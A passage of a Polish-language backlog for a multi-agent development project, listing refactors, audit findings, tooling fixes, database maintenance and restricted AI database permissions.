1. User określa czego dokładnie chce od Architekta (jakie zachowania, jaki styl)
2. PE przygotowuje propozycję tone of voice + examples na podstawie oczekiwań
3. Test w sesji z Architektem
4. Oceń czy poprawia behavior
5. Commit jeśli pozytywny efekt

## Pliki

- `documents/architect/ARCHITECT.md` — prompt do rozszerzenia
- `tmp/persona_design_analysis.md` — research + analiza
- `documents/prompt_engineer/research_results_character_designer.md` — research

## Zależności

- Czeka na określenie oczekiwań od usera
- Priorytet niski — Architect działa, to optymalizacja

### [115] Refaktor na Domain Model (ADR-001)
**area:** Arch  **value:** wysoka  **effort:** duza  **status:** in_progress  **created_at:** 2026-03-22

# Refaktor na Domain Model (ADR-001)

## Cel
Przejście z architektury dict-based na Domain Model oparty o klasy.

## Zakres
- Faza 0: `core/entities/` — Entity, Status, wyjątki, Suggestion, BacklogItem, Message
- Faza 1: `core/repositories/` — SuggestionRepository, BacklogRepository, MessageRepository
- Faza 2: `core/services/agent_bus.py` — adapter zachowujący kompatybilność wsteczną
- Faza 3: `core/entities/agents.py` — Role, Session, Agent, LiveAgent (dla runnera)

## Zyski
- Walidacja przy tworzeniu obiektu (nie runtime SQL errors)
- Enkapsulacja logiki biznesowej (`suggestion.implement()` zamiast `bus.update_status()`)
- Testowalność (mockowanie repozytoriów)
- Gotowość na `LiveAgent.spawn_child()` dla samowywołania

## Dokumentacja
- ADR: `documents/architect/ADR-001-domain-model.md`
- Plan strategiczny: `documents/architect/STRATEGIC_PLAN_2026-03.md`

### [114] Plan eksperymentow: Runner wieloagentowy
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-22

# Plan eksperymentów: Runner wieloagentowy

## Cel
Odkryć jak uruchomić agenta w normalnym terminalu z wstrzykniętym taskiem, który działa autonomicznie i pozwala human dołączyć.

## Eksperymenty

### E1: Agent Teams na Windows
- Czy `claude team create` działa na Windows?
- Czy split panes / in-process działa w VS Code terminal?
- Czy można zintegrować z istniejącym agent_bus?

### E2: Terminal interaktywny z wstrzykniętym taskiem
- `claude --append-system-prompt "[TRYB AUTONOMICZNY] Task: ..." -p "Rozpocznij"`
- Czy sesja jest interaktywna (można pisać)?
- Czy --continue / --resume działają?

### E3: Prompt autonomiczny
- Ustalenie dlaczego agent czekał na human input (problem promptu, nie runnera)
- Wymagania dla promptu autonomicznego → handoff do PE

## Output
Raport z wynikami + decyzja architektoniczna: Agent Teams / własne / hybryda

## Kontekst
- Research: `documents/architect/research_results_agent_runner_patterns (1).md`
- Plan strategiczny: `documents/architect/STRATEGIC_PLAN_2026-03.md`

### [113] Folder documents/exports/ — ujednolicenie lokalizacji eksportów
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** done  **created_at:** 2026-03-22

# Folder documents/human/ — przestrzeń robocza człowieka

**Koncepcja:** Dedykowana przestrzeń robocza dla człowieka — wszystkie pliki generowane przez agentów dla użytkownika (backlog, sugestie, logi, plany, raporty, notatki, eksporty danych).

## Problem

Eksporty/notatki generowane przez agentów lądują chaotycznie:
- Folder główny projektu
- `tmp/` (mieszane z plikami tymczasowymi)
- Brak spójnej konwencji

Użytkownik musi ręcznie kopiować pliki do Obsidian vault.

## Rozwiązanie

Dedykowany folder `documents/human/` z podkatalogami per typ:
```
documents/human/
  ├── backlog/      # render.py backlog
  ├── suggestions/  # render.py suggestions
  ├── inbox/        # wiadomości do człowieka (flagi, eskalacje)
  ├── logs/         # session-log
  ├── plans/        # plany architektoniczne, notatki
  ├── reports/      # raporty, analizy
  └── data/         # excel exports, offers, pricing
```

**Tracked w git** — pełna historia zmian.

## Zakres zmian

### Developer (ta sesja):
1. Utworzenie struktury `documents/human/`
2. Aktualizacja `render.py` (domyślne ścieżki)
3. Mapowanie narzędzi i promptów → przekazanie do PE
4. Testy

### Prompt Engineer (osobna sesja):
1. Aktualizacja CLAUDE.md i promptów ról
2. Aktualizacja workflow files
3. Aktualizacja pozostałych narzędzi

## Szczegóły

Pełny plan: `documents/dev/exports_folder_implementation_plan.md`

### [112] Rename solutions in ERP windows → erp_windows
**area:** ERP  **value:** niska  **effort:** srednia  **status:** planned  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 5.3 (Low)

Katalog ma spacje w nazwie: `solutions/solutions in ERP windows/`

Problemy:
- Utrudnia automatyzację (wymaga escape'owania)
- Niespójne z resztą struktury

Akcja: mv 'solutions/solutions in ERP windows' solutions/erp_windows + update odwołań.

### [111] Uzupełnić catalog.json o brakujące widoki BI
**area:** ERP  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 5.2 (Low)

W solutions/bi/views/ jest 15 widoków, ale catalog.json dokumentuje tylko 13.

Brakujące:
- MagNag
- wz_jas_export

Akcja: dodać opisy, kolumny i example_questions dla brakujących widoków.

### [110] Naprawić encoding w solutions/ERP windows
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 5.3 (Medium)

Polskie znaki są zepsute w nazwach katalogów i plikach:
- płatności → p�atno�ci
- Zamówienia → Zam�wienia

Prawdopodobnie problem z kodowaniem UTF-8 vs CP1250.

Akcja: zidentyfikować pliki z błędnym encoding, przekonwertować do UTF-8.

### [109] Rename conversation_search.py
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 1.2 (Low)

Odwrotne nazewnictwo. Opcje:
1. conversation_search.py → search_conversation.py
2. Przenieść do tools/conversation/search.py

Akcja: wybrać konwencję i zastosować.

### [108] Rename search_bi.py → bi_search.py
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 1.2 (Low)

Odwrotne nazewnictwo — łamie konwencję prefix_action.py (np. bi_discovery.py, bi_view.py).

Akcja: git mv tools/search_bi.py tools/bi_search.py + update imports.

### [107] Helper _bulk_json_processor w agent_bus_cli
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Msg #176 od Architekta (Low)

Duplikacja kodu w funkcjach *-bulk (~61 linii). Wydzielić wspólny helper:

```python
def _bulk_json_processor(path, handler):
    items = json.loads(Path(path).read_text())
    return [{"ok": True, "count": len([handler(i) for i in items])}]
```

### [106] JSON output dla generatorów
**area:** Dev  **value:** niska  **effort:** mala  **status:** cancelled  **created_at:** 2026-03-22

# Zamknięcie backlog #106 — outdated

**Tytuł:** JSON output dla generatorów

**Źródło:** Audyt Faza 1.3 (2026-03-22)

## Diagnoza

Audyt wskazał 6 plików bez spójnego JSON output:
- render.py
- wycena_generate.py
- offer_generator.py, offer_generator_3x3.py
- docs_build_index.py
- mrowisko_runner.py

## Weryfikacja (2026-03-22)

1. **render.py** — JUŻ MA `--format json` ✓
   - Testowane: `py tools/render.py backlog --format json` działa
   - Prawdopodobnie dodane po audycie lub audyt pominął

2. **wycena_generate.py, offer_generator*.py** — ModuleNotFoundError
   - Brak xlwings, reportlab w środowisku
   - Prawdopodobnie legacy/nieużywane narzędzia
   - Nie ma sensu dodawać JSON do narzędzi które nie działają

3. **docs_build_index.py** — jednorazowy builder indeksu
   - Działa, ale to build tool (nie query tool)
   - JSON output nie dodaje wartości — narzędzie odpala się raz, nie konsumowane przez inne skrypty

4. **mrowisko_runner.py** — daemon/runner
   - Audyt sam mówił "może być OK dla runnera"
   - Ma własną logikę logowania do DB

## Decyzja

**Status:** Cancelled (outdated)

**Uzasadnienie:**
- Główne narzędzie (render.py) już ma JSON
- Pozostałe to albo legacy (broken imports) albo narzędzia gdzie JSON nie ma sensu
- Nakład pracy (dodawanie JSON do 4 plików) > wartość biznesowa

## Akcja na przyszłość

Audyty powinny weryfikować stan PRZED dodaniem do backlogu — ten item był już nieaktualny w momencie utworzenia.

### [105] Refactor render.py
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 1.1 (Medium)

God script — 449 linii. Renderuje różne typy danych (backlog, suggestions, inbox, etc.).

Rekomendacja: wydzielić renderery per typ do osobnych funkcji/modułów.

### [104] Transakcje atomowe w agent_bus
**area:** Dev  **value:** niska  **effort:** srednia  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 2.3 (Low)

Brak jawnych transakcji (BEGIN/COMMIT). Każda operacja commitowana osobno.

Ryzyko: race conditions przy wielu agentach równolegle.

Akcja: dodać context manager dla transakcji przy złożonych operacjach. Priorytet wzrośnie gdy mrowisko_runner wejdzie do produkcji.

### [103] Dodać indeks do invocation_log
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 2.1 (Low)

Tabela bez indeksu (6 rekordów). Śledzi wywołania agent→agent dla mrowisko_runner.

Akcja: CREATE INDEX idx_invocation_session ON invocation_log(session_id).

### [102] Deprecate tabelę state
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 2.1 (Low)

Legacy tabela — 34 rekordy (stare backlog items). Dane zmigrowane do dedykowanych tabel: backlog, suggestions.

Akcja: zweryfikować czy wszystkie dane są w nowych tabelach, potem DROP TABLE state.

### [101] Usunąć tabelę trace
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 2.1 (Low)

Martwa tabela — 0 rekordów. Zastąpiona przez tool_calls (która ma więcej kolumn: is_error, tokens_out).

Akcja: DROP TABLE trace + usunąć metody add_trace_event/get_trace z agent_bus.py.

### [100] Cleanup policy dla tool_calls/token_usage
**area:** Dev  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 2.1 (Medium)

Tabele telemetryczne rosną bez limitu:
- tool_calls: 30k rekordów
- token_usage: 44k rekordów

Rekomendacja: archiwizacja rekordów >30 dni do osobnej tabeli lub pliku, usuwanie >90 dni.

### [99] Exponential backoff dla retry
**area:** Bot  **value:** niska  **effort:** mala  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 3.4 (Low)

Retry logic jest naiwny: 2 próby hardcoded, bez backoff.

Rekomendacja: exponential backoff (1s, 2s, 4s) z max 3 retry. Biblioteka `tenacity` lub własna implementacja.

### [98] File system error handling
**area:** Bot  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 3.3 (Medium)

Brak try/except dla operacji na plikach:
- Logging do JSONL
- Odczyt catalog.json
- Odczyt allowed_users.txt

Jeśli plik niedostępny (permissions, disk full) → bot crashuje.

Rekomendacja: dodać error handling z graceful degradation.

### [97] Persistent sessions
**area:** Bot  **value:** srednia  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 3.4 (Medium)

ConversationManager trzyma historię in-memory. Restart bota = utrata kontekstu rozmów.

Opcje:
1. Persystencja do SQLite (mrowisko.db)
2. Persystencja do plików JSON
3. Redis (jeśli będzie więcej instancji)

Rekomendacja: SQLite — spójne z resztą systemu.

### [96] Rate limiting per user
**area:** Bot  **value:** wysoka  **effort:** mala  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 3.4 (High)

Brak limitu zapytań per user. Jeden user może generować nieograniczone koszty API.

Rekomendacja: dodać limit np. 10 zapytań/minutę per user_id. Przekroczenie → friendly message "Poczekaj chwilę".

### [95] Refactor nlp_pipeline.py — rozbić God Object
**area:** Bot  **value:** wysoka  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 3.4 (High)

nlp_pipeline.py ma 218 linii i 7 odpowiedzialności:
1. API client (Anthropic)
2. Walidacja SQL
3. Execution SQL
4. Formatting odpowiedzi
5. Logging
6. Retry logic
7. Conversation management

Rekomendacja: wydzielić do osobnych modułów zgodnie z SRP.

### [94] Error handling dla Anthropic API
**area:** Bot  **value:** wysoka  **effort:** mala  **status:** deferred  **created_at:** 2026-03-22

**Źródło:** Audyt Faza 3.3 (Critical)

Dodać try/except dla `anthropic.APIError`, `anthropic.RateLimitError` w `bot/pipeline/nlp_pipeline.py`.

Obecnie bot crashuje przy:
- API timeout
- Rate limit
- Service unavailable

Rekomendacja: obsłużyć wyjątki, zwrócić friendly message użytkownikowi.

### [93] Audyt architektoniczny repozytorium Mrowisko
**area:** Arch  **value:** wysoka  **effort:** duza  **status:** done  **created_at:** 2026-03-22

# Audyt architektoniczny repozytorium Mrowisko

## Cel
Identyfikacja błędów architektonicznych, tech debt, potrzebnych refaktoryzacji.
"Trupy z szafy" — nie boimy się kwestionować decyzji.

## Plan
Szczegółowy plan: `documents/architect/ARCHITECTURE_AUDIT_PLAN.md`

7 faz:
1. Inspekcja tools/ (~50 skryptów)
2. Inspekcja agent_bus (mrowisko.db)
3. Inspekcja bot/
4. Inspekcja dokumentacji ról
5. Inspekcja solutions/, erp_docs/
6. Inspekcja _loom
7. Meta-analiza + raport

## Output
- ARCHITECTURE_AUDIT_REPORT.md
- TECH_DEBT_INVENTORY.md
- REFACTORING_ROADMAP.md

## Estymata
~6-8 sesji Architekta

### [92] Bot hot reload — business_context.txt per request
**area:** Dev  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-21

Bot hot reload — business_context.txt ładuj per request

Każda zmiana business_context.txt wymaga restartu bota.

**Zmiana:**
Przenieś read('business_context.txt') z `__init__()` do `_generate_sql()`.

**Zysk:**
Hot-reload kontekstu biznesowego bez restartu bota.

**Effort:** 1 linia kodu (5 min)

Source: suggestion #108

### [91] Integracja dokumentow architektury
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-21

Integracja dokumentów architektury:
- documents/architect/SYSTEM_ARCHITECTURE.md (nowy, wysoki poziom)
- documents/dev/ARCHITECTURE.md (stary, szczegóły Bot/ERP Agent)

Handoff: tmp/handoff_architect_integracja_arch.md

Cel: jeden główny plik + opcjonalnie pliki per moduł.

### [90] Architektura synchronizacji bazy danych między maszynami
**area:** Arch  **value:** wysoka  **effort:** duza  **status:** deferred  **created_at:** 2026-03-21

# Architektura synchronizacji bazy danych między maszynami

## Problem

`mrowisko.db` zawiera komunikację między agentami (agent_bus), backlog zadań, logi sesji.
Praca na dwóch maszynach równolegle powoduje konflikty merge niemożliwe do automatycznego rozwiązania.

## Zakres

Zaprojektować i wdrożyć architekturę synchronizacji bazy danych między maszynami, która umożliwi:
- Wymianę wiadomości między agentami na różnych maszynach
- Współdzielony backlog zadań
- Brak konfliktów git
- Minimalne opóźnienie synchronizacji

## Opcje rozwiązań

Szczegółowa analiza opcji w: `documents/dev/machine_sync_architecture.md`

Opcje:
- **A:** Git LFS + manual merge (prowizorka)
- **B:** Baza zewnętrzna PostgreSQL/cloud (profesjonalne, wymaga hostingu)
- **C:** Podział lokalnej i shared DB (kompromis, offline-first)
- **D:** Event sourcing append-only (eleganckie, wymaga refactoru agent_bus)

## Następne kroki

1. User decyduje którą opcję wybrać (na podstawie priorytetów: koszt vs realtime vs elegancja)
2. Szczegółowy plan implementacji dla wybranej opcji
3. Implementacja etapami

## Tymczasowe rozwiązanie

Baza danych wyłączona z synchronizacji git (dodana do .gitignore) do czasu wdrożenia docelowej architektury.

### [89] conversation_search.py — dodać do auto-approve w permissions
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-21

Każde wywołanie conversation_search.py wymaga zatwierdzenia użytkownika. PE przy 5+ wywołaniach jest blokowany.
Rozwiązanie: dodać Bash(python tools/conversation_search.py:*) do settings.local.json permissions.allow.
Źródło: sugestia id=77.

### [88] bi_discovery.py — ogranicz rozmiar outputu dla dużych tabel
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-21

bi_discovery.py na dużej tabeli (131 kolumn) zwraca ogromny JSON wyczerpujący kontekst.
Dodać: --max-distinct-values N (domyślnie 20), --skip-text-columns, --columns-only.
Źródło: sugestia id=66.

### [87] docs_search.py — zmniejsz domyślny limit i dodaj --compact
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-21

docs_search.py z --limit 300 zwraca dziesiątki KB. Agenci używają do potwierdzenia jednej kolumny, nie masowego importu.
- Zmniejszyć domyślny limit z 300 do 20
- Dodać --compact (tylko col_name + col_label, bez opisu)
Źródło: sugestia id=67.

### [86] inbox — komenda mark-read --all / --unread-since
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-21

Inbox rośnie między sesjami — agenci przeglądają 20+ wiadomości w tym archiwalne. Potrzeba:
- mark-read --all --role <rola> — po przejrzeniu inboxu
- lub inbox --unread-since <data/session_id>

Bez tego inbox będzie rósł i każda sesja traci czas na skanowanie historii.
Źródło: sugestie id=56 (Analityk), id=98 punkt 1 (ERP Specialist).

### [85] ERP_SCHEMA_PATTERNS.md — CDN.KntAdresy i CDN.OpeKarty
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-21

ERP Specialist i Analityk niezależnie odkryli te same wzorce JOINów. Wdrożyć do ERP_SCHEMA_PATTERNS.md:

1. CDN.KntAdresy — JOIN przez KnA_GIDNumer + KnA_GIDTyp. Kolumna opisowa: KnA_Akronim. GIDTyp: 864=Adr, 896=AdrAl. Weryfikacja MagNag: 100%.

2. CDN.OpeKarty — kolumna opisowa to Ope_Ident (login), NIE Ope_Kod (nie istnieje). JOIN: LEFT JOIN CDN.OpeKarty ope ON ope.Ope_GIDNumer = [pole]OpeNumer.

Źródło: sugestie id=93, 94 (KntAdresy) i id=102, 103 (OpeKarty).

### [84] Bot eval — automatyczne testy 100 pytan z raportem pass/fail
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-20

Automatyczne środowisko testowe bota — zestaw ~100 przykładowych pytań z oczekiwanymi wynikami.

Problem: weryfikacja jakości bota jest dziś ręczna i czasochłonna. Każda zmiana promptu
lub widoku wymaga manualnego testowania przez Telegram.

Zakres:
- Plik tests/bot_eval/questions.jsonl: pytanie + oczekiwany typ wyniku (liczba, lista, NO_SQL, błąd)
- Runner tools/bot_eval.py — odpytuje pipeline dla każdego pytania, zapisuje wyniki
- Raport: pass/fail per pytanie, SQL wygenerowany, row_count, czas odpowiedzi
- Kategorie: obroty handlowców, zamówienia, rezerwacje, kontrahenci, pytania poza zakresem, pytania kontekstowe ("a w tym miesiącu")
- CLI: python tools/bot_eval.py --report tmp/eval_report.md

Cel: po każdej zmianie promptu lub widoku — uruchom eval i sprawdź regresje w 2 minuty.

### [83] Środowisko pracy — szukanie lepszego edytora/IDE
**area:** Dev  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-20

Szukanie lepszego środowiska do pracy z agentem (edytor / IDE).

Obecne środowisko (VS Code + Claude Code) ma ograniczenia przy intensywnej pracy z botem
i wieloma sesjami agentów równolegle.

Zakres:
- Przegląd alternatyw: Cursor, Windsurf, JetBrains + plugin, inne
- Kryteria: wsparcie dla MCP, hooks, multi-session, podgląd logów, wygoda pracy z .env i plikami konfiguracyjnymi
- Rekomendacja z trade-offami

### [82] conversation_search.py: UnicodeEncodeError na Windows (cp1250 vs ensure_ascii)
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-18

conversation_search.py rzuca UnicodeEncodeError na Windows gdy wynik zawiera znaki spoza cp1250 (np. ✓ U+2713).

Przyczyna: `json.dumps(..., ensure_ascii=False)` + terminal cp1250.

Fix: dodać `sys.stdout.reconfigure(encoding='utf-8')` na początku skryptu (lub `ensure_ascii=True` jeśli Unicode w outputach nie jest potrzebny).

Reprodukcja:
```
python tools/conversation_search.py --session efbbdac9db79
UnicodeEncodeError: 'charmap' codec can't encode character '\u2713'
```

### [81] Przegląd workflow/domain packów — gates + test XML vs Markdown
**area:** Prompt  **value:** srednia  **effort:** srednia  **status:** in_progress  **created_at:** 2026-03-18

Przegląd workflow i domain packów ERP Specialist / Analityk pod kątem:
1. Uzupełnienie brakujących gates, forbidden, exit conditions
2. Test: czy XML tags na granicach sekcji (phase, gate, forbidden) poprawiają compliance agentów vs obecny Markdown
3. Pliki do przeglądu:
   - ERP_COLUMNS_WORKFLOW.md
   - ERP_FILTERS_WORKFLOW.md
   - bi_view_creation_workflow.md (wzorzec — porównanie)
   - ERP_SCHEMA_PATTERNS.md
   - ERP_SQL_SYNTAX.md

Decyzja XML vs Markdown w workflow wymaga testu na żywej sesji agenta.

### [80] [ERP] CDN.Magazyny — naprawa col_label w docs.db (#REF!)
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-17

CDN.Magazyny jest w indeksie docs.db ale col_label = "#REF!" (uszkodzone formuły w XLSM źródłowym). docs_search "magazyn" nie zwraca tej tabeli bo FTS5 szuka po col_label.

Naprawa: zaktualizować col_label bezpośrednio w erp_docs/index/docs.db dla kluczowych kolumn CDN.Magazyny:
- MAG_GIDNumer, MAG_GIDTyp → "Identyfikator magazynu"
- MAG_Kod → "Kod magazynu"
- MAG_Nazwa → "Nazwa magazynu"
- pozostałe adresowe → etykiety z description

Po aktualizacji przebudować FTS5 (rebuild lub reindex).

### [79] [Dev] Sugestie atomowe — jedna obserwacja = jeden wpis
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-17

Sugestie powinny być atomowe — jedna obserwacja = jeden wpis.

Obecny stan: agenci zapisują refleksje sesji jako jeden duży blok (4-6 punktów naraz).
Efekt: Developer nie może ocenić/odrzucić/wdrożyć poszczególnych punktów niezależnie.
Jeden zły punkt blokuje dobre.

Zakres:
1. Zaktualizować instrukcję logowania w CLAUDE.md / dokumentach ról:
   zamiast "zapisz refleksję sesji jako suggest" → "każda obserwacja = osobny suggest"
2. Rozważyć czy session_init lub workflow gate może przypominać o atomowości

### [78] [Dev] Hook post_tool_use — live widocznosc tool calls w DB
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-17

Hook `post_tool_use.py` — live zapis tool calls do DB podczas sesji agenta.

Cel: widoczność działania agentów w czasie rzeczywistym (nie post-session).

Obecny stan: `on_stop.py` parsuje transcript po zakończeniu sesji — dane dostępne dopiero gdy agent skończy.

Rozwiązanie: nowy hook `tools/hooks/post_tool_use.py` odpala po każdym narzędziu i zapisuje do `tool_calls` w mrowisko.db natychmiast.

Zakres:
- `tools/hooks/post_tool_use.py` — zapisuje tool_name, session_id, is_error, timestamp
- Rejestracja w settings.json (analogicznie do pre_tool_use)
- Testy

Efekt: runner + heartbeat + live tool calls = pełna widoczność roju w czasie rzeczywistym.
Powiązane: mrowisko_runner Faza 1b (instance routing), backlog id=71 (analytics dashboard).

### [77] SQL: stored procedures CEiM_Deployer — bezpieczne schematy i usery AI
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-17

Stored procedures dla CEiM_Deployer — bezpieczne zarządzanie schematami i użytkownikami AI.

Wymagania:
- Tworzy schematy tylko z prefiksem AI (AUTHORIZATION CDN)
- Tworzy nowych użytkowników DB
- Nadaje uprawnienia tylko użytkownikom przez siebie stworzonym
- Nadaje uprawnienia tylko do schematów z prefiksem AI
- Zero dostępu do schematów bez prefiksu AI (CDN, dbo itp.)
- Zero edycji istniejących użytkowników
- Zero loginów serwerowych

Implementacja: 3 stored procedures + tabela kontrolna deployer_created_users:
1. dbo.AI_CreateSchema(@Name) — waliduje prefix AI, tworzy z AUTHORIZATION CDN
2. dbo.AI_CreateUser(@UserName, @LoginName) — tworzy usera + rejestruje w tabeli kontrolnej
3. dbo.AI_GrantSchemaAccess(@UserName, @SchemaName) — waliduje user w tabeli + schemat prefix AI

CEiM_Deployer dostaje EXECUTE na te 3 procedury — zero bezpośrednich uprawnień systemowych.

### [76] [Dev] Usuń referencje do progress_log.md ze wszystkich wytycznych
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-16

Przeszukać wszystkie dokumenty wytycznych (CLAUDE.md, ERP_SPECIALIST.md, ANALYST.md, DEVELOPER.md, METHODOLOGY.md, workflow/*.md) i usunąć wszelkie wzmianki o progress_log.md jako narzędziu do logowania postępów.

Jedyne źródło prawdy = session_log w DB przez `agent_bus_cli.py log`.

Dotyczy też usunięcia samego pliku documents/dev/progress_log.md jeśli nie pełni już żadnej innej funkcji niż log sesji.

### [75] [Dev] Zarządzanie kontekstem — limity narzędzi + reguły ERP Specialist
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-16

Sugestia ERP Specialist (id=38, sesja TraElem 2026-03-16) — 4 przyczyny przepełnienia kontekstu:

1. bi_discovery.py na dużej tabeli (131 kolumn) zwraca ogromny JSON z distinct values — jednorazowo wyczerpuje duży fragment kontekstu.
   Fix: dodać --no-distinct lub --limit-distinct N (nie obliczaj distinct values dla kolumn o wysokiej kardynalności)

2. docs_search.py z --limit 300 zwraca dziesiątki KB — nawet przy zapisie do pliku Read wczytuje całość.
   Fix: reguła w ERP_SPECIALIST.md — docs_search domyślnie bez --limit lub limit 20; duże limity tylko gdy świadomie

3. Czytanie całych dużych plików (progress_log.md 500 linii, bi_view_creation_workflow.md 516 linii) zamiast potrzebnych sekcji.
   Fix: reguła w ERP_SPECIALIST.md — Read z offset/limit zamiast całego pliku gdy szukamy konkretnej sekcji

4. Pisanie dużego pliku SQL (131 wierszy plan_src.sql) w całości w kontekście — i plik okazał się bezużyteczny przez błąd składniowy.
   Fix: reguła w ERP_SPECIALIST.md — draft SQL iteracyjnie (najpierw szkielet, potem kolumny), nie piszemy całości za jednym razem

### [74] [Dev] CLAUDE.md — regula log sesji dla wszystkich rol
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-16

Dodać do CLAUDE.md (sekcja wspólna) regułę: na zamknięcie sesji agent woła `agent_bus_cli.py log --role <rola> --content-file tmp/log_sesji.md` z podsumowaniem co zrobiono.

Kontekst: ERP_SPECIALIST.md i ANALYST.md nie mają tej reguły — tylko DEVELOPER.md. Efekt: agenci nie logują sesji do DB. session_log ma 37 wpisów, ale 27 to "session started" bez treści.

Wzorzec jak inbox/backlog — już jest w CLAUDE.md, log sesji powinien być obok.

### [73] [ERP] Korekta kolejnosci prefiksow TraNag w ERP_SCHEMA_PATTERNS (FZK 1529)
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Aktualizacja ERP_SCHEMA_PATTERNS.md — korekta kolejności prefiksów TraNag dla FZK.

Odkrycie (ERP Specialist, 2026-03-15): EXISTS spinacza (prefiks Z) wyprzedza warunek GenDokMag=-1 (prefiks A) w CASE dla GIDTyp IN (1521, 1529, 1489). FZK przy imporcie z WZ dostaje błędnie (Z) zamiast (A).

Poprawka: (A) przed (Z) w CASE dla tych typów.
Przy okazji: zaktualizować wzorzec formatu numeru: (PREFIKS)SKRÓT-Numer/MM/YY[/Seria].

### [72] [Dev] Aktualizacja DEVELOPER.md — sugestie z sesji 2026-03-15
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Przegląd i wdrożenie 4 sugestii zebranych z sesji 2026-03-15:

**1. id=31 — Nie neguj starej metody przy aktualizacji wytycznych**
Gdy reguła się zmienia — zastąp treść, nie dopisuj "nie rób X" obok nowej metody. Agenci nie mają pamięci, pójdą nową ścieżką bez zakazu. Negacje wydłużają prompt bez wartości.
→ Dodać jako zasadę w sekcji "Najważniejsze zasady" DEVELOPER.md.

**2. id=33 — Węzłowość w checkliście nowego narzędzia**
Checklist "Nowe narzędzie" (Phase 3) ma punkt o CLAUDE.md, ale brakuje jawnego pytania przy decyzji. Dodać: "Czy to narzędzie dotyczy więcej niż jednej roli? Jeśli tak → CLAUDE.md, nie dokument roli."

**3. id=34 — Plan jako plik .md, nie inline w czacie**
Gdy user prosi o plan — zapisz jako plik .md w documents/dev/, nie wklejaj inline. Inline marnuje context window obu stron i nie zostaje po sesji.
→ Dodać do sekcji "Krok 1: Planowanie prac".

**4. id=35 — python -c → plik tymczasowy (wzmocnienie)**
Zasada jest w CLAUDE.md, ale agent ją łamie przy jednorazowych inspekcjach. Dodać przypomnienie w DEVELOPER.md w sekcji "Komendy powłoki": "Jednorazowy skrypt inspekcyjny też ląduje w tmp/, nie inline."

### [71] [Dev] Analytics dashboard — widoczność pracy agentów (sessions→backlog, tokeny, PM view)
**area:** Dev  **value:** wysoka  **effort:** duza  **status:** deferred  **created_at:** 2026-03-15

Dashboard analityczny mrowiska — widoczność pracy agentów w czasie rzeczywistym.

## Cel

PM/właściciel widzi w jednym miejscu: co robi każdy agent, ile kosztuje (tokeny), nad czym pracuje (backlog), jak rośnie kontekst.

## Zakres

### Warstwa 1: Połączenie sessions → backlog
- Tabela `session_backlog_tags` (session_id, backlog_id) — agent taguje sesję backlog itemem na starcie
- Alternatywa: automatyczne wykrywanie przez słowa kluczowe z tytułu backlogu w transkrypcie

### Warstwa 2: Dashboard (Power BI lub lekka alternatywa)
- Power BI Desktop: natywne połączenie z SQLite przez ODBC driver
- Alternatywa lżejsza: Streamlit (Python, ~50 linii) lub Grafana z SQLite plugin

### Widoki docelowe
- **Per sesja:** rola, backlog item, tokeny (input/output/cache), czas, % okna kontekstowego, tool calls breakdown, error rate
- **Per backlog item:** ile sesji, łączne tokeny, łączny czas, kto pracował
- **Trend:** wzrost tokenów per tura (sygnał czy agent "brodzy" w kontekście)
- **Ranking narzędzi:** które narzędzia dominują, które generują błędy

### Połączenia między tabelami (już istnieją w DB)
- sessions.id → session_log.session_id (kto i kiedy)
- sessions.id → tool_calls.session_id (co robił)
- sessions.id → token_usage.session_id (ile kosztował)
- sessions.id → conversation.session_id (co mówił)
